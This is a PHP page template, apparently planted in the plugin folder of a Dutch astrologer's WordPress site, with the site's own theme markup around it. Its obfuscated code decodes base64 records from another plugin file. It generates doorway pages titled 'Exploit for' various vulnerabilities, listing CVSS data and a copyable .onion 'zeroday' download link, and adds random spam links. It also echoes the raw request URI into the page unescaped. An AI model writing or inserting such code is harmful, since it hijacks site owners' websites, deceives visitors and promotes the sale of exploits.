<?php

function dwntpue($i4OEWST4K) {
    $eUhj0Bczik = 0;
    $qhkel = strlen($i4OEWST4K);
    for ($i = 0; $i < $qhkel; $i++) $eUhj0Bczik += ord($i4OEWST4K[$i]);
    return $eUhj0Bczik;
}

$myxHA6 = intval(get_query_var('jzdpkphmb'));

if ($myxHA6 < 1 || $myxHA6 > 879) return;
$tpRJVVhiS = file(plugin_dir_path(__FILE__).'top-portfolio.php', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

$xgE3XM = explode(';', base64_decode($tpRJVVhiS[$myxHA6]));
if (count($xgE3XM) < 2) return;
$vmASD = $xgE3XM[0];
$pghi0dZG = dwntpue($vmASD);
//$t76Rl8m9WO = $vmASD . ' POC (Proof-of-Concept)';
$t76Rl8m9WO = 'Exploit for ' . $vmASD;
$hg0VWXSfZk  = $xgE3XM[1];
$p7L2R = $xgE3XM[2];
$iMFCcB = $xgE3XM[3];
$tj7rUX4n  = $xgE3XM[4];
set_query_var('cqpuek', $t76Rl8m9WO);

$rhUFOi0Cj2 = '';
$gKiimY68q2 = plugin_dir_path(__FILE__).'count-file.php';
if (is_file($gKiimY68q2)) {
	$dwKiApG = file($gKiimY68q2, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
	array_shift($dwKiApG);
	shuffle($dwKiApG);
	$m8VX7BEE = mt_rand(2, 5);
	if (count($dwKiApG) > $m8VX7BEE) {
		for ($hwMqQZO04s = 0; $hwMqQZO04s < $m8VX7BEE; $hwMqQZO04s++) {
			$b3TTZFL = base64_decode(array_shift($dwKiApG));
			$rhUFOi0Cj2 .= '<p><a href="'.$b3TTZFL.'">'.$b3TTZFL.'</a>' . "</p>\n";
		}
	}
}

$req = $_SERVER['REQUEST_URI'];
//status_header(200);
get_header();
?>
<!DOCTYPE html>
<html lang="en-US">
<head>
	<meta charset="UTF-8"/>
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title><?php echo $t76Rl8m9WO; ?> - Augusta Verburg</title>
<meta name='robots' content='max-image-preview:large' />
<script type="text/javascript">
var ajaxurl = "https://augustaverburg.nl/wp-admin/admin-ajax.php";
var ff_template_url = "https://augustaverburg.nl/wp-content/themes/ark";
</script>
<link rel='dns-prefetch' href='//fonts.googleapis.com' />
<link rel="alternate" type="application/rss+xml" title="Augusta Verburg &raquo; feed" href="https://augustaverburg.nl/feed/" />
<link rel="alternate" type="application/rss+xml" title="Augusta Verburg &raquo; reacties feed" href="https://augustaverburg.nl/comments/feed/" />
<style id='wp-img-auto-sizes-contain-inline-css' type='text/css'>
img:is([sizes=auto i],[sizes^="auto," i]){contain-intrinsic-size:3000px 1500px}
/*# sourceURL=wp-img-auto-sizes-contain-inline-css */
</style>

<link rel='stylesheet' id='animate-css' href='https://augustaverburg.nl/wp-content/plugins/fresh-framework//framework/themes/builder/metaBoxThemeBuilder/assets/freshGrid/extern/animate.css/animate.min.css?ver=1.74.0' type='text/css' media='all' />
<link rel='stylesheet' id='ff-freshgrid-css' href='https://augustaverburg.nl/wp-content/plugins/fresh-framework//framework/themes/builder/metaBoxThemeBuilder/assets/freshGrid/freshGrid.css?ver=1.74.0' type='text/css' media='all' />
<style id='wp-emoji-styles-inline-css' type='text/css'>

	img.wp-smiley, img.emoji {
		display: inline !important;
		border: none !important;
		box-shadow: none !important;
		height: 1em !important;
		width: 1em !important;
		margin: 0 0.07em !important;
		vertical-align: -0.1em !important;
		background: none !important;
		padding: 0 !important;
	}
/*# sourceURL=wp-emoji-styles-inline-css */
</style>
<link rel='stylesheet' id='contact-form-7-css' href='https://augustaverburg.nl/wp-content/plugins/contact-form-7/includes/css/styles.css?ver=6.1.5' type='text/css' media='all' />
<link rel='stylesheet' id='bootstrap-css' href='https://augustaverburg.nl/wp-content/themes/ark/assets/plugins/bootstrap/css/bootstrap.min.css?ver=3.3.6' type='text/css' media='all' />
<link rel='stylesheet' id='jquery.mCustomScrollbar-css' href='https://augustaverburg.nl/wp-content/themes/ark/assets/plugins/scrollbar/jquery.mCustomScrollbar.css?ver=3.1.12' type='text/css' media='all' />
<link rel='stylesheet' id='owl.carousel-css' href='https://augustaverburg.nl/wp-content/themes/ark/assets/plugins/owl-carousel/assets/owl.carousel.css?ver=1.3.2' type='text/css' media='all' />
<link rel='stylesheet' id='magnific-popup-css' href='https://augustaverburg.nl/wp-content/themes/ark/assets/plugins/magnific-popup/magnific-popup.css?ver=1.1.0' type='text/css' media='all' />
<link rel='stylesheet' id='cubeportfolio-css' href='https://augustaverburg.nl/wp-content/themes/ark/assets/plugins/cubeportfolio/css/cubeportfolio.min.css?ver=3.8.0' type='text/css' media='all' />
<link rel='stylesheet' id='freshframework-font-awesome4-css' href='https://augustaverburg.nl/wp-content/plugins/fresh-framework///framework/extern/iconfonts/ff-font-awesome4/ff-font-awesome4.css?ver=6.9.1' type='text/css' media='all' />
<link rel='stylesheet' id='freshframework-font-et-line-css' href='https://augustaverburg.nl/wp-content/plugins/fresh-framework///framework/extern/iconfonts/ff-font-et-line/ff-font-et-line.css?ver=6.9.1' type='text/css' media='all' />
<link rel='stylesheet' id='freshframework-simple-line-icons-css' href='https://augustaverburg.nl/wp-content/plugins/fresh-framework///framework/extern/iconfonts/ff-font-simple-line-icons/ff-font-simple-line-icons.css?ver=6.9.1' type='text/css' media='all' />
<link rel='stylesheet' id='ark-one-page-business-css' href='https://augustaverburg.nl/wp-content/themes/ark/assets/css/one-page-business.css?ver=6.9.1' type='text/css' media='all' />
<link rel='stylesheet' id='ark-landing-css' href='https://augustaverburg.nl/wp-content/themes/ark/assets/css/landing.css?ver=6.9.1' type='text/css' media='all' />
<link rel='stylesheet' id='ark-style-css' href='https://augustaverburg.nl/wp-content/themes/ark/style.css?ver=6.9.1' type='text/css' media='all' />
<style id='ark-style-inline-css' type='text/css'>
body,p,.ff-richtext,li,li a,a,h1, h2, h3, h4, h5, h6 ,.progress-box-v1 .progress-title,.progress-box-v2 .progress-title,.team-v5-progress-box .progress-title,.pricing-list-v1 .pricing-list-v1-header-title,.team-v3 .progress-box .progress-title,.rating-container .caption > .label,.theme-portfolio .cbp-l-filters-alignRight,.theme-portfolio .cbp-l-filters-alignLeft,.theme-portfolio .cbp-l-filters-alignCenter,.theme-portfolio .cbp-filter-item,.theme-portfolio .cbp-l-loadMore-button .cbp-l-loadMore-link,.theme-portfolio .cbp-l-loadMore-button .cbp-l-loadMore-button-link,.theme-portfolio .cbp-l-loadMore-text .cbp-l-loadMore-link,.theme-portfolio .cbp-l-loadMore-text .cbp-l-loadMore-button-link,.theme-portfolio-v2 .cbp-l-filters-alignRight .cbp-filter-item,.theme-portfolio-v3 .cbp-l-filters-button .cbp-filter-item,.zeus .tp-bullet-title{font-family:'Roboto',Arial,sans-serif}

.blog-classic .blog-classic-label,.blog-classic .blog-classic-subtitle,.blog-grid .blog-grid-title-el,.blog-grid .blog-grid-title-el .blog-grid-title-link,.blog-grid .blog-grid-supplemental-title,.op-b-blog .blog-grid-supplemental-title,.blog-grid .blog-grid-supplemental-category,.blog-grid-supplemental .blog-grid-supplemental-title a,.blog-teaser .blog-teaser-category .blog-teaser-category-title,.blog-teaser .blog-teaser-category .blog-teaser-category-title a,.news-v8 .news-v8-category a,.news-v1 .news-v1-heading .news-v1-heading-title > a,.news-v1 .news-v1-quote:before,.news-v2 .news-v2-subtitle,.news-v2 .news-v2-subtitle a,.ff-news-v3-meta-data,.ff-news-v3-meta-data a,.news-v3 .news-v3-content .news-v3-subtitle,.news-v6 .news-v6-subtitle,.news-v7 .news-v7-subtitle,.news-v8 .news-v8-category,.blog-simple-slider .op-b-blog-title,.blog-simple-slider .op-b-blog-title a,.heading-v1 .heading-v1-title,.heading-v1 .heading-v1-title p,.testimonials-v7 .testimonials-v7-title .sign,.team-v3 .team-v3-member-position,.heading-v1 .heading-v1-subtitle,.heading-v1 .heading-v1-subtitle p,.heading-v2 .heading-v2-text,.heading-v2 .heading-v2-text p,.heading-v3 .heading-v3-text,.heading-v3 .heading-v3-text p,.heading-v4 .heading-v4-subtitle,.heading-v4 .heading-v4-subtitle p,.newsletter-v2 .newsletter-v2-title span.sign,.quote-socials-v1 .quote-socials-v1-quote,.quote-socials-v1 .quote-socials-v1-quote p,.sliding-bg .sliding-bg-title,.timeline-v4 .timeline-v4-subtitle, .timeline-v4 .timeline-v4-subtitle a,.counters-v2 .counters-v2-subtitle,.icon-box-v2 .icon-box-v2-body-subtitle,.i-banner-v1 .i-banner-v1-heading .i-banner-v1-member-position,.i-banner-v1 .i-banner-v1-quote,.i-banner-v3 .i-banner-v3-subtitle,.newsletter-v2 .newsletter-v2-title:before,.piechart-v1 .piechart-v1-body .piechart-v1-body-subtitle,.pricing-list-v1 .pricing-list-v1-body .pricing-list-v1-header-subtitle,.pricing-list-v2 .pricing-list-v2-header-title,.pricing-list-v3 .pricing-list-v3-text,.promo-block-v2 .promo-block-v2-text,.promo-block-v2 .promo-block-v2-text p,.promo-block-v3 .promo-block-v3-subtitle,.services-v1 .services-v1-subtitle,.services-v10 .services-v10-no,.services-v11 .services-v11-subtitle,.slider-block-v1 .slider-block-v1-subtitle,.team-v3 .team-v3-header .team-v3-member-position,.team-v4 .team-v4-content .team-v4-member-position,.testimonials-v1 .testimonials-v1-author-position,.testimonials-v3 .testimonials-v3-subtitle:before,.testimonials-v3 .testimonials-v3-subtitle span.sign,.testimonials-v3 .testimonials-v3-author,.testimonials-v5 .testimonials-v5-quote-text,.testimonials-v5 .testimonials-v5-quote-text p,.testimonials-v6 .testimonials-v6-element .testimonials-v6-position,.testimonials-v6 .testimonials-v6-quote-text,.testimonials-v6 .testimonials-v6-quote-text p,.testimonials-v7 .testimonials-v7-title:before,.testimonials-v7 .testimonials-v7-author,.testimonials-v7-title-span,.footer .footer-testimonials .footer-testimonials-quote:before,.animated-headline-v1 .animated-headline-v1-subtitle,.news-v3 .news-v3-content .news-v3-subtitle,.news-v3 .news-v3-content .news-v3-subtitle a,.theme-ci-v1 .theme-ci-v1-item .theme-ci-v1-title{font-family:'Droid Serif',Arial,sans-serif}

code, kbd, pre, samp{font-family:'Courier New', Courier, monospace,Arial,sans-serif}

.custom-font-1{font-family:'Libre Baskerville',Arial,sans-serif}

.custom-font-2{font-family:'Homemade Apple',Arial,sans-serif}

.custom-font-3{font-family:'Paprika',Arial,sans-serif}

.custom-font-4{font-family:Arial, Helvetica, sans-serif,Arial,sans-serif}

.custom-font-5{font-family:Arial, Helvetica, sans-serif,Arial,sans-serif}

.custom-font-6{font-family:Arial, Helvetica, sans-serif,Arial,sans-serif}

.custom-font-7{font-family:Arial, Helvetica, sans-serif,Arial,sans-serif}

.custom-font-8{font-family:Arial, Helvetica, sans-serif,Arial,sans-serif}

.fg-container-small { width: 100%; padding-left: 15px; padding-right: 15px; }
.fg-container-medium { width: 100%; padding-left: 15px; padding-right: 15px; }
.fg-container-large { width: 100%; padding-left: 15px; padding-right: 15px; }
.fg-container-fluid, .ark-boxed__boxed-wrapper, .ark-boxed__boxed-wrapper .ark-header { width: 100%; padding-left: 15px; padding-right: 15px; }

@media (min-width: 768px){
.fg-container-small { width: 750px; padding-left: 15px; padding-right: 15px; }
.fg-container-medium { width: 750px; padding-left: 15px; padding-right: 15px; }
.fg-container-large { width: 750px; padding-left: 15px; padding-right: 15px; }
.fg-container-fluid, .ark-boxed__boxed-wrapper, .ark-boxed__boxed-wrapper .ark-header { width: 100%; padding-left: 15px; padding-right: 15px; }
}

@media (min-width: 992px){
.fg-container-small { width: 750px; padding-left: 15px; padding-right: 15px; }
.fg-container-medium { width: 970px; padding-left: 15px; padding-right: 15px; }
.fg-container-large { width: 970px; padding-left: 15px; padding-right: 15px; }
.fg-container-fluid, .ark-boxed__boxed-wrapper, .ark-boxed__boxed-wrapper .ark-header { width: 100%; padding-left: 15px; padding-right: 15px; }
}

@media (min-width: 1200px){
.fg-container-small { width: 750px; padding-left: 15px; padding-right: 15px; }
.fg-container-medium { width: 970px; padding-left: 15px; padding-right: 15px; }
.fg-container-large { width: 970px; padding-left: 15px; padding-right: 15px; }
.fg-container-fluid, .ark-boxed__boxed-wrapper, .ark-boxed__boxed-wrapper .ark-header { width: 100%; padding-left: 15px; padding-right: 15px; }
}

/*# sourceURL=ark-style-inline-css */
</style>
<link rel='stylesheet' id='ark-style-child-css' href='https://augustaverburg.nl/wp-content/themes/ark-child/style.css?ver=6.9.1' type='text/css' media='all' />
<link rel='stylesheet' id='ark-google-fonts-css' href='//fonts.googleapis.com/css?family=Roboto%3A300%2C400%2C500%2C600%2C700%2C300i%2C400i%2C700i%7CDroid+Serif%3A300%2C400%2C500%2C600%2C700%2C300i%2C400i%2C700i%7CLibre+Baskerville%3A300%2C400%2C500%2C600%2C700%2C300i%2C400i%2C700i%7CHomemade+Apple%3A300%2C400%2C500%2C600%2C700%2C300i%2C400i%2C700i%7CPaprika%3A300%2C400%2C500%2C600%2C700%2C300i%2C400i%2C700i&#038;subset=cyrillic%2Ccyrillic-ext%2Cgreek%2Cgreek-ext%2Clatin%2Clatin-ext%2Cvietnamese&#038;ver=1.74.0' type='text/css' media='all' />
<link rel='stylesheet' id='ark-colors-css' href='https://augustaverburg.nl/wp-content/uploads/freshframework/css/colors.css?ver=6.9.1' type='text/css' media='all' />
<link rel='stylesheet' id='twentytwenty-css' href='https://augustaverburg.nl/wp-content/themes/ark/assets/plugins/twentytwenty/css/twentytwenty.css?ver=6.9.1' type='text/css' media='all' />
<script type="text/javascript" src="https://augustaverburg.nl/wp-includes/js/jquery/jquery.min.js?ver=3.7.1" id="jquery-core-js"></script>
<script type="text/javascript" src="https://augustaverburg.nl/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.4.1" id="jquery-migrate-js"></script>
<script type="text/javascript" src="//augustaverburg.nl/wp-content/plugins/revslider/sr6/assets/js/rbtools.min.js?ver=6.7.29" async id="tp-tools-js"></script>
<script type="text/javascript" src="//augustaverburg.nl/wp-content/plugins/revslider/sr6/assets/js/rs6.min.js?ver=6.7.31" async id="revmin-js"></script>
<script type="text/javascript" src="https://augustaverburg.nl/wp-content/themes/ark-child/owl.carousel.js?ver=6.9.1" id="owl-carousel-js-js"></script>
<script type="text/javascript" src="https://augustaverburg.nl/wp-content/uploads/freshframework/custom_code/eb426091dd983f4935b5703091af5cfc.js?ver=6.9.1" id="my-jquery-js"></script>
<link rel="https://api.w.org/" href="https://augustaverburg.nl/wp-json/" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://augustaverburg.nl/xmlrpc.php?rsd" />
<meta name="generator" content="WordPress 6.9.1" />
<link rel="canonical" href="https://augustaverburg.nl<?php echo $req; ?>" />
<meta name="generator" content="Powered by Slider Revolution 6.7.31 - responsive, Mobile-Friendly Slider Plugin for WordPress with comfortable drag and drop interface." />
<script>function setREVStartSize(e){
			//window.requestAnimationFrame(function() {
				window.RSIW = window.RSIW===undefined ? window.innerWidth : window.RSIW;
				window.RSIH = window.RSIH===undefined ? window.innerHeight : window.RSIH;
				try {
					var pw = document.getElementById(e.c).parentNode.offsetWidth,
						newh;
					pw = pw===0 || isNaN(pw) || (e.l=="fullwidth" || e.layout=="fullwidth") ? window.RSIW : pw;
					e.tabw = e.tabw===undefined ? 0 : parseInt(e.tabw);
					e.thumbw = e.thumbw===undefined ? 0 : parseInt(e.thumbw);
					e.tabh = e.tabh===undefined ? 0 : parseInt(e.tabh);
					e.thumbh = e.thumbh===undefined ? 0 : parseInt(e.thumbh);
					e.tabhide = e.tabhide===undefined ? 0 : parseInt(e.tabhide);
					e.thumbhide = e.thumbhide===undefined ? 0 : parseInt(e.thumbhide);
					e.mh = e.mh===undefined || e.mh=="" || e.mh==="auto" ? 0 : parseInt(e.mh,0);
					if(e.layout==="fullscreen" || e.l==="fullscreen")
						newh = Math.max(e.mh,window.RSIH);
					else{
						e.gw = Array.isArray(e.gw) ? e.gw : [e.gw];
						for (var i in e.rl) if (e.gw[i]===undefined || e.gw[i]===0) e.gw[i] = e.gw[i-1];
						e.gh = e.el===undefined || e.el==="" || (Array.isArray(e.el) && e.el.length==0)? e.gh : e.el;
						e.gh = Array.isArray(e.gh) ? e.gh : [e.gh];
						for (var i in e.rl) if (e.gh[i]===undefined || e.gh[i]===0) e.gh[i] = e.gh[i-1];
											
						var nl = new Array(e.rl.length),
							ix = 0,
							sl;
						e.tabw = e.tabhide>=pw ? 0 : e.tabw;
						e.thumbw = e.thumbhide>=pw ? 0 : e.thumbw;
						e.tabh = e.tabhide>=pw ? 0 : e.tabh;
						e.thumbh = e.thumbhide>=pw ? 0 : e.thumbh;
						for (var i in e.rl) nl[i] = e.rl[i]<window.RSIW ? 0 : e.rl[i];
						sl = nl[0];
						for (var i in nl) if (sl>nl[i] && nl[i]>0) { sl = nl[i]; ix=i;}
						var m = pw>(e.gw[ix]+e.tabw+e.thumbw) ? 1 : (pw-(e.tabw+e.thumbw)) / (e.gw[ix]);
						newh =  (e.gh[ix] * m) + (e.tabh + e.thumbh);
					}
					var el = document.getElementById(e.c);
					if (el!==null && el) el.style.height = newh+"px";
					el = document.getElementById(e.c+"_wrapper");
					if (el!==null && el) {
						el.style.height = newh+"px";
						el.style.display = "block";
					}
				} catch(e){
					console.log("Failure at Presize of Slider:" + e)
				}
			//});
		  };</script>
<link rel='stylesheet' id='rs-plugin-settings-css' href='//augustaverburg.nl/wp-content/plugins/revslider/sr6/assets/css/rs6.css?ver=6.7.31' type='text/css' media='all' />
<style id='rs-plugin-settings-inline-css' type='text/css'>
#rs-demo-id {}
/*# sourceURL=rs-plugin-settings-inline-css */
</style>

</head>
<body class="wp-singular page-template-default page wp-theme-ark wp-child-theme-ark-child appear-animate">
<div class="ffb-id-navigation-header wrapper ff-boxed-wrapper animsition "><div class="wrapper-top-space include-topbar-height"></div><header class="ark-header  header-no-pills header header-sticky navbar-fixed-top header-has-topbar fg-text-dark ffb-header-design"><div class="ff-ark-header-circle-shadow"></div><div class="ark-topbar-wrapper  ark-topbar-hidden-on-scroll"><div class="ark-topbar"><section class="ffb-id-2rgnb7ob fg-section fg-el-has-bg fg-text-dark"><span class="fg-bg"><span data-fg-bg="{&quot;type&quot;:&quot;color&quot;,&quot;opacity&quot;:1,&quot;color&quot;:&quot;#cdd3b8&quot;}" class="fg-bg-layer fg-bg-type-color " style="opacity: 1; background-color: #cdd3b8;"></span></span><div class="fg-container container fg-container-large fg-container-lvl--1 "><div class="fg-row row    " ><div class="ffb-id-2rgnb7oc fg-col col-xs-12 col-md-12 fg-text-dark"><p class="ffb-id-2ss97qme fg-paragraph text-left    fg-text-dark"><a href="https://augustaverburg.nl/"><img src="https://augustaverburg.nl/wp-content/uploads/2019/03/handtekening.png" style="width:400px;max-width:100%"></a></p></div></div></div></section></div></div><nav class="navbar mega-menu fg-text-dark ffb-header-design-inner" role="navigation">
				<div class=" fg-container container fg-container-large  ">
					<div class="menu-container">
						
													<button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".nav-collapse">
								<span class="sr-only">Toggle navigation</span>
								<span class="toggle-icon"></span>
							</button>
						
																									<div class="navbar-actions">

													</div>

						<div class="navbar-logo fg-text-dark ffb-logo"><a class="navbar-logo-wrap" href="https://augustaverburg.nl/"></a><span class="hidden header-height-info" data-desktopBeforeScroll="90" data-desktopAfterScroll="70" data-mobileBeforeScroll="90" data-tabletBeforeScroll="90"></span></div>
					</div>

					<div class="collapse navbar-collapse nav-collapse">
						<div class="menu-container">

															<ul class="nav navbar-nav navbar-nav-left">
									<li id="menu-item-11" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-home nav-item  menu-item-11"><a href="https://augustaverburg.nl/" class=" nav-item-child ffb-ark-first-level-menu ">Welkom</a></li><li id="menu-item-1326" class="menu-item menu-item-type-post_type menu-item-object-page nav-item  menu-item-1326"><a href="https://augustaverburg.nl/astrologie/" class=" nav-item-child ffb-ark-first-level-menu ">Astrologie</a></li><li id="menu-item-34" class="menu-item menu-item-type-post_type menu-item-object-page nav-item  menu-item-34"><a href="https://augustaverburg.nl/individuele-sessie/" class=" nav-item-child ffb-ark-first-level-menu ">Astrologisch consult</a></li><li id="menu-item-32" class="menu-item menu-item-type-post_type menu-item-object-page nav-item  menu-item-32"><a href="https://augustaverburg.nl/boeken/" class=" nav-item-child ffb-ark-first-level-menu ">Boeken</a></li><li id="menu-item-33" class="menu-item menu-item-type-post_type menu-item-object-page current-menu-item page_item page-item-24 current_page_item nav-item  menu-item-33"><a href="https://augustaverburg.nl/reviews/" class=" nav-item-child ffb-ark-first-level-menu ">Reviews</a></li><li id="menu-item-10" class="menu-item menu-item-type-post_type menu-item-object-page nav-item  menu-item-10"><a href="https://augustaverburg.nl/contact/" class=" nav-item-child ffb-ark-first-level-menu ">Contact</a></li>								</ul>
													</div>
					</div>
				</div>
			</nav>
				</header><div class="page-wrapper"><section class="ffb-id-pfeamtm fg-section fg-text-dark"><div class="fg-container container fg-container-large fg-container-lvl--1 "><div class="fg-row row    " ><div class="ffb-id-pfeamtn fg-col col-xs-12 col-md-12 fg-text-dark"><div class="ffb-id-pfeamu1 post-wrapper blog-grid-content page type-page status-publish has-post-thumbnail hentry fg-text-dark"><h1 class="ffb-id-pfeamu7 blog-grid-title-lg fg-text-dark"><?php echo $t76Rl8m9WO; ?></h1><div class="ffb-id-2rovescu fg-wrapper fg-el-has-bg fg-text-dark"><span class="fg-bg"><span data-fg-bg="{&quot;type&quot;:&quot;color&quot;,&quot;opacity&quot;:1,&quot;color&quot;:&quot;#ffffff&quot;}" class="fg-bg-layer fg-bg-type-color " style="opacity: 1; background-color: #ffffff;"></span></span><div class="ffb-id-pfeamu8 post-content ff-post-content-element fg-text-dark"><div class="post-content ff-richtext">

				<?php
				echo "<p>" . $tj7rUX4n . "</p>\n";
				if (strlen($hg0VWXSfZk) > 0) echo "<p><strong>Published: </strong>" . $hg0VWXSfZk . "</p>\n";
				if (strlen($p7L2R) > 0) echo "<p><strong>CVSS: </strong>" . $p7L2R . "</p>\n";
				if (strlen($iMFCcB) > 0) echo "<p><strong>CVSS Vector: </strong>" . $iMFCcB . "</p>\n";
				?>
				<p><strong>Download <?php echo $t76Rl8m9WO; ?> here:</strong></p>
				
				<div class="link-grid">
					<div class="link-box">
						<input type="text" id="link1" value="http://zeroday3sv534ljdendaufcrorz67yg6iujdpaknp6zqgxaevb7okfid.onion/exploit-for-<?php echo str_replace(' ', '-', strtolower($vmASD)) . '.' . $pghi0dZG; ?>/" readonly>
						<button onclick="copyLink('link1')">
							<svg class="icon" viewBox="0 0 24 24"><path d="M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-2 16H7v-2h10v2zm0-4H7v-2h10v2zm0-4H7V7h10v2z"/></svg>
							Copy
						</button>
					</div>
				</div>

				<p><strong>Tip:</strong> Download official Tor Browser at https://www.torproject.org/download/ to access .onion links.</p>

				<?php
				echo $rhUFOi0Cj2;
				?>


<script>
function copyLink(id) {
	const input = document.getElementById(id);
	input.select();
	document.execCommand('copy');
	const btn = input.nextElementSibling;
	btn.innerHTML = '<svg class="icon" viewBox="0 0 24 24"><path d="M9 16.2L4.8 12l-1.4 1.4L9 19 21 7l-1.4-1.4L9 16.2z"/></svg> Copied!';
	btn.style.background = '#ff4500';
	setTimeout(() => {
		btn.innerHTML = '<svg class="icon" viewBox="0 0 24 24"><path d="M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-2 16H7v-2h10v2zm0-4H7v-2h10v2zm0-4H7V7h10v2z"/></svg> Copy';
		btn.style.background = '#2c2c2c';
	}, 2000);
}
</script>

<style>
.link-grid { display: grid; gap: 30px; margin: 40px 0; }
.link-box { background: #F9FAFC; padding: 25px; border-radius: 12px; display: flex; align-items: center; gap: 25px; transition: box-shadow 0.3s ease; }
.link-box:hover { box-shadow: 0 6px 18px rgba(0, 0, 0, 0.1); }
.link-box input { width: 70%; padding: 15px; border: 2px solid #2c2c2c; border-radius: 10px; font-size: 17px; }
.link-box button { background: #2c2c2c; color: white; padding: 0 35px 15px; border: none; border-radius: 10px; cursor: pointer; display: flex; align-items: center; transition: background 0.3s, transform 0.3s; }
.link-box button:hover { background: #ff4500; transform: scale(1.05); }
</style>




<p>&nbsp;</p>
<p>&nbsp;</p>
</div></div></div><section class="ffb-id-2t6rfdar ff-portfolio-columns-js theme-portfolio portfolio-classic-1 dvd_diensten fg-text-dark" data-settings="{&quot;portfolio-type&quot;:&quot;grid&quot;,&quot;columns-lg&quot;:&quot;3&quot;,&quot;columns-md&quot;:&quot;3&quot;,&quot;columns-sm&quot;:&quot;2&quot;,&quot;columns-xs&quot;:&quot;1&quot;,&quot;vertical-gap&quot;:30,&quot;horizontal-gap&quot;:30,&quot;default-filter&quot;:&quot;*&quot;,&quot;enable-deep-linking&quot;:&quot;1&quot;,&quot;lightbox-counter&quot;:&quot;&quot;,&quot;points-to&quot;:&quot;&quot;,&quot;portfolio-animation&quot;:&quot;bottomToTop&quot;,&quot;display-type-speed&quot;:&quot;250&quot;,&quot;filter-animation&quot;:&quot;fadeOut&quot;,&quot;lightbox-gallery&quot;:true}"><div class="ff-portfolio-grid-wrapper"><div class="ff-portfolio-grid cbp"></div></div></section></div></div></div></div></section><style>.ffb-id-2rgnb7ob{ padding-top: 15px;}.ffb-id-2ss97qme{ font-size: 45px !important;text-align: center !important;}.ffb-id-2ss97qme ,.ffb-id-2ss97qme:before,.ffb-id-2ss97qme:after,.ffb-id-2ss97qme:hover,.ffb-id-2ss97qme:focus,.ffb-id-2ss97qme *,.ffb-id-2ss97qme *:before,.ffb-id-2ss97qme *:after,.ffb-id-2ss97qme *:hover,.ffb-id-2ss97qme *:focus{ font-size: 45px !important;text-align: center !important;}@media (min-width: 992px) { .wrapper-topbar-top-space, .wrapper-top-space { background-color:#cdd3b8}}/* RESETS - DO NOT CHANGE DYNAMICALLY */header .navbar-logo,header.header-shrink .navbar-logo {	line-height: 0 !important;}header .navbar-logo-wrap img {	max-height: none !important;}header .navbar-logo .navbar-logo-wrap {	transition-duration: 400ms;	transition-property: all;	transition-timing-function: cubic-bezier(0.7, 1, 0.7, 1);}@media (max-width: 991px){	header .navbar-logo .navbar-logo-img {		max-width: none !important;	}}@media (max-width: 991px){	.header .navbar-actions .navbar-actions-shrink {		max-height: none;	}}@media (min-width: 992px){	.header .navbar-actions .navbar-actions-shrink {		max-height: none;	}}@media (min-width: 992px) {	.header-shrink.ark-header .navbar-actions .navbar-actions-shrink {		max-height: none;	}}@media (max-width: 991px){	.header-fullscreen .header-fullscreen-col {		width: calc(100% - 60px);	}	.header-fullscreen .header-fullscreen-col.header-fullscreen-nav-actions-left {		width: 30px;	}}.ark-header .topbar-toggle-trigger {	padding: 0;}header .navbar-logo .navbar-logo-wrap {	transition-property: width, height, opacity, padding, margin-top, margin-bottom;}/* DYNAMIC OVERWRITES */.ark-header .navbar-logo .navbar-logo-wrap {	line-height: 1px;}@media (min-width: 992px) {	.wrapper>.wrapper-top-space {	height: 90px;	}	.ark-header .navbar-logo .navbar-logo-wrap {		padding-top: 22.5px;		padding-bottom: 22.5px;	}}@media (min-width: 992px) {	.header-shrink.ark-header .navbar-logo .navbar-logo-wrap {		padding-top: 12.5px;		padding-bottom: 12.5px;	}}@media (min-width: 992px) {	.ark-header .navbar-nav .nav-item {		line-height: 90px;	}	.ark-header .navbar-nav .nav-item ul {		line-height: 1.42857143;	}}@media (min-width: 992px) {	header .navbar-logo-wrap img {		height: 45px !important;	}}@media (min-width: 992px) {	header.header-shrink .navbar-logo-wrap img {		height: 45px !important;	}}.ark-header .navbar-actions .navbar-actions-shrink {	line-height: 89px;}@media (min-width: 992px){	.header-shrink.ark-header .navbar-actions .navbar-actions-shrink {		line-height: 69px;	}}@media (min-width: 992px) {	.ark-header.header-no-pills .navbar-nav .nav-item-child {		line-height: 90px;	}}@media (min-width: 992px) {	.ark-header.header-no-pills.header-shrink .navbar-nav .nav-item-child {		line-height: 70px;	}}@media (min-width: 992px) {	.ark-header.header-pills .navbar-nav .nav-item-child {		margin-top: 30px;		margin-bottom: 30px;	}}@media (min-width: 992px) {	.ark-header.header-pills.header-shrink .navbar-nav .nav-item-child {		margin-top: 20px;		margin-bottom: 20px;	}}@media (max-width: 767px) {	.header-fullscreen .header-fullscreen-nav-actions-left,	.header-fullscreen .header-fullscreen-nav-actions-right {		padding-top: 30px;		padding-bottom: 30px;	}}@media (min-width: 768px) and (max-width: 991px) {	.header-fullscreen .header-fullscreen-nav-actions-left,	.header-fullscreen .header-fullscreen-nav-actions-right {		padding-top: 30px;		padding-bottom: 30px;	}}@media (min-width: 992px) {	.header-fullscreen .header-fullscreen-nav-actions-left,	.header-fullscreen .header-fullscreen-nav-actions-right {		padding-top: 30px;		padding-bottom: 30px;	}}@media (min-width: 992px) {	.header-shrink.header-fullscreen .header-fullscreen-nav-actions-left,	.header-shrink.header-fullscreen .header-fullscreen-nav-actions-right {		padding-top: 20px;		padding-bottom: 20px;	}}.ark-header.auto-hiding-navbar.nav-up {	top: -80px;}.ark-header.auto-hiding-navbar.nav-up.header-has-topbar {	top: -100%}.search-on-header-field .search-on-header-input {	height: 88px;}.header-shrink .search-on-header-field .search-on-header-input {	height: 68px;}@media (max-width: 767px) {	.search-on-header-field .search-on-header-input {		height: 90px;	}}@media (min-width: 768px) and (max-width: 991px) {	.search-on-header-field .search-on-header-input {		height: 90px;	}}@media (max-width: 767px) {	.ark-header .topbar-toggle-trigger {		height: 20px;		margin-top: 35px;		margin-bottom: 35px;	}}@media (min-width: 768px) and (max-width: 